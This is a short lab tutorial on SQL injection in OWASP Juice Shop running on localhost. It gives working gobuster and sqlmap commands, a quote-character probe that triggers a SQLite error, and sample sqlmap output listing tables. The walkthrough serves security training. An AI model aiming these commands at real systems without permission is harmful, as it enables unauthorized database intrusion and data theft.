# 🎯 Tutorial 1: From gobuster to sqlmap — Finding & Exploiting SQLi in Juice Shop

> **Goal**: Discover a hidden SQL injection in Juice Shop using directory brute-forcing → parameter analysis → automated exploitation.  
> **Lab**: [`cyber-lab-env`](https://github.com/Evaristus230/cyber-lab-env) (Juice Shop @ `http://localhost:3000`)  
> **Tools**: `gobuster`, browser dev tools, `sqlmap`

---

## 🔍 Step 1: Directory Discovery with gobuster

First, find hidden endpoints:
```bash
gobuster dir -u http://localhost:3000 -w /usr/share/wordlists/dirb/common.txt -t 30 -x php,js,json

## Interesting Output
/rest               (Status: 301)
/rest/user/login    (Status: 200)
/rest/products/search (Status: 200)

Step 2: Manual Testing — Find the Injection Point

Open http://localhost:3000 in browser
Go to Products → search for test
In DevTools (Network tab), see the request
GET /rest/products/search?q=test
/rest/products/search?q='


→ Returns {"errors":[{"message":"SQLITE_ERROR: unrecognized token: \"'\""}]}
✅ Confirmed: SQL error exposed → likely SQLi.

# 🤖 Step 3: Automate with sqlmap
sqlmap -u "http://localhost:3000/rest/products/search?q=test" --batch --risk=2 --level=3

🔍 Why these flags? 

--risk=2: Test for OR-based injections (needed for boolean-based here)
--level=3: Include User-Agent, Referer, and Host headers (Juice Shop checks Origin)
--batch: Skip interactive prompts

# Output
[INFO] GET parameter 'q' is injectable
...
[INFO] retrieved database name: 'sqlite_master'
[INFO] retrieved table names: 'Users', 'Products', 'Reviews'...
